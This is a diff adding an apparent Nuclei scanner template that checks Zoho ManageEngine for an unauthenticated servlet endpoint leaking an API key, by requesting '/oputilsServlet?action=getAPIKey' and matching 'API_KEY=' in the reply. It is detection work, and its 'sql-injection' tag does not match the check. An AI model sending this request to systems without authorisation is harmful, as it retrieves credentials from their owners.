@@ -1,0 +1,20 @@
+id: zoho-manageengine-auth-bypass
+
+info:
+  name: Zoho ManageEngine Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/oputilsServlet?action=getAPIKey"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "API_KEY="
+          - "SyncResult="
+        part: body
